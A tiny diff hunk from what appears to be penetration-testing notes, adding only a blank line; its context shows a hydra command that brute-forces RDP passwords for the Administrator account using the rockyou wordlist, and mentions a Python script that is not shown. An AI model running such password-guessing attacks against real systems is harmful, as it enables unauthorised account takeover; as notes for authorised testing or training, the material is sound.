@@ -75,6 +75,7 @@ Use hydra:
 
 hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<target ip>
 
+
 Or use the Python script below.
 
 
